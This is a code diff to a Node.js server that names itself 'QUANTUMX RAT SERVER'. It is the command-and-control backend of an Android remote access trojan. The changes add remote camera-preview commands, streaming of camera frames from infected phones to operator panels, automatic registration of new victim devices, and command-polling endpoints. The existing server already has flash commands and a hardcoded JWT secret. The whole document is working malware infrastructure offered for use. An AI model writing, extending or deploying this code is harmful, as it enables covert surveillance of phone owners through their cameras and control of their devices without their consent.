@@ -31,6 +31,7 @@ let users = [
 let devices = new Map();
 let commands = new Map();
 let commandResults = new Map();
+let cameraSessions = new Map(); // Untuk tracking camera preview
 
 // ========== AUTH ==========
 const JWT_SECRET = 'quantumx-super-secret-key-2024';
@@ -113,7 +114,16 @@ app.get('/api/devices', authenticateToken, (req, res) => {
     res.json(deviceList);
 });
 
-// Send command
+// Get single device
+app.get('/api/device/:deviceId', authenticateToken, (req, res) => {
+    const device = devices.get(req.params.deviceId);
+    if (!device) return res.status(404).json({ error: 'Device not found' });
+    res.json(device);
+});
+
+// ========== COMMAND API ==========
+
+// Send command to device
 app.post('/api/device/:deviceId/command', authenticateToken, (req, res) => {
     const deviceId = req.params.deviceId;
     const { command, params } = req.body;
@@ -137,7 +147,21 @@ app.post('/api/device/:deviceId/command', authenticateToken, (req, res) => {
     io.to(deviceId).emit('command', commandData);
     
     const deviceName = devices.get(deviceId)?.deviceName || deviceId;
-    console.log(`📤 [COMMAND] FLASH -> ${deviceName} (${deviceId}) | DURATION: ${params.duration}s`);
+    
+    // LOG BERDASARKAN JENIS COMMAND
+    if (command === 'flash') {
+        console.log(`⚡ [FLASH] -> ${deviceName} (${deviceId}) | DURATION: ${params.duration}s`);
+    } else if (command === 'camera_start') {
+        console.log(`📸 [CAMERA] START -> ${deviceName} (${deviceId}) | INTERVAL: ${params.interval}ms`);
+        cameraSessions.set(deviceId, { active: true, interval: params.interval });
+    } else if (command === 'camera_stop') {
+        console.log(`📸 [CAMERA] STOP -> ${deviceName} (${deviceId})`);
+        cameraSessions.delete(deviceId);
+    } else if (command === 'camera_frame') {
+        console.log(`📸 [CAMERA] FRAME REQ -> ${deviceName} (${deviceId})`);
+    } else {
+        console.log(`📤 [COMMAND] ${command.toUpperCase()} -> ${deviceName} (${deviceId})`);
+    }
     
     res.json({ success: true, commandId, message: 'Command sent' });
 });
@@ -167,16 +191,36 @@ app.post('/api/device/command/result', (req, res) => {
         
         const deviceName = devices.get(deviceId)?.deviceName || deviceId;
         if (status === 'completed') {
-            console.log(`✅ [SUCCESS] FLASH -> ${deviceName} | DURATION: ${result?.duration}s`);
+            if (deviceCommands[commandIndex].command === 'flash') {
+                console.log(`✅ [FLASH] SUCCESS -> ${deviceName} | DURATION: ${result?.duration}s`);
+            } else {
+                console.log(`✅ [SUCCESS] ${deviceCommands[commandIndex].command.toUpperCase()} -> ${deviceName}`);
+            }
         } else {
-            console.log(`❌ [FAILED] FLASH -> ${deviceName}`);
+            console.log(`❌ [FAILED] ${deviceCommands[commandIndex].command.toUpperCase()} -> ${deviceName}`);
         }
     }
     
     res.json({ success: true });
 });
 
+// Get command result
+app.get('/api/command/:commandId/result', authenticateToken, (req, res) => {
+    const result = commandResults.get(req.params.commandId);
+    if (!result) return res.status(404).json({ error: 'Command result not found' });
+    res.json(result);
+});
+
+// Get pending commands
+app.get('/api/device/:deviceId/commands/pending', (req, res) => {
+    const deviceId = req.params.deviceId;
+    const deviceCommands = commands.get(deviceId) || [];
+    const pending = deviceCommands.filter(cmd => cmd.status === 'pending');
+    res.json(pending);
+});
+
 // ========== WEBSOCKET ==========
+
 io.on('connection', (socket) => {
     console.log(`🔌 [SOCKET] CONNECTED: ${socket.id}`);
     
@@ -205,6 +249,18 @@ io.on('connection', (socket) => {
             device.model = model || device.model;
             device.batteryLevel = batteryLevel || device.batteryLevel;
             devices.set(deviceId, device);
+        } else {
+            devices.set(deviceId, {
+                deviceId,
+                deviceName: deviceName || 'Unknown Device',
+                androidVersion: androidVersion || 'Unknown',
+                manufacturer: manufacturer || 'Unknown',
+                model: model || 'Unknown',
+                batteryLevel: batteryLevel || 0,
+                lastSeen: new Date().toISOString(),
+                online: true,
+                registeredAt: new Date().toISOString()
+            });
         }
         
         console.log(`📱 [DEVICE] ONLINE: ${deviceName} (${deviceId}) - ANDROID: ${androidVersion} - BATTERY: ${batteryLevel}%`);
@@ -248,6 +304,20 @@ io.on('connection', (socket) => {
         console.log(`💓 [HEARTBEAT] ${deviceName} (${deviceId}) - BATTERY: ${batteryLevel}%`);
     });
     
+    // ===== CAMERA FRAME DARI APK =====
+    socket.on('camera-frame', (data) => {
+        const { deviceId, imageData } = data;
+        
+        // Kirim ke semua panel yang subscribe
+        io.emit('camera-frame', {
+            deviceId,
+            imageData,
+            timestamp: new Date().toISOString()
+        });
+        
+        console.log(`📸 [CAMERA] FRAME from ${deviceId} (${imageData.length} bytes)`);
+    });
+    
     // ===== PANEL CONNECT =====
     socket.on('panel-connect', () => {
         socket.isPanel = true;
@@ -263,6 +333,11 @@ io.on('connection', (socket) => {
                 const device = devices.get(deviceId);
                 device.online = false;
                 devices.set(deviceId, device);
+                
+                // Hapus camera session jika ada
+                if (cameraSessions.has(deviceId)) {
+                    cameraSessions.delete(deviceId);
+                }
             }
             
             const deviceName = devices.get(deviceId)?.deviceName || deviceId;
@@ -279,7 +354,7 @@ io.on('connection', (socket) => {
     });
 });
 
-// ========== STATS ==========
+// ========== STATS API ==========
 app.get('/api/stats', authenticateToken, (req, res) => {
     const deviceList = Array.from(devices.values());
     const now = new Date();
@@ -295,19 +370,21 @@ app.get('/api/stats', authenticateToken, (req, res) => {
         totalDevices: devices.size,
         onlineDevices: onlineCount,
         totalCommands: commandResults.size,
-        pendingCommands: Array.from(commands.values()).flat().filter(c => c.status === 'pending').length
+        pendingCommands: Array.from(commands.values()).flat().filter(c => c.status === 'pending').length,
+        activeCameraSessions: cameraSessions.size
     });
 });
 
-// ========== START ==========
+// ========== START SERVER ==========
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
+server.listen(PORT, '0.0.0.0', () => {
     console.log(`
 ╔═══════════════════════════════════════╗
-║    QUANTUMX RAT SERVER v3.0           ║
+║    QUANTUMX RAT SERVER v4.0           ║
 ║    RUNNING ON PORT: ${PORT}                      ║
 ║    WEBSOCKET: ws://localhost:${PORT}             ║
 ║    API: http://localhost:${PORT}/api            ║
+║    FEATURES: FLASH + CAMERA PREVIEW    ║
 ╚═══════════════════════════════════════╝
     `);
 });
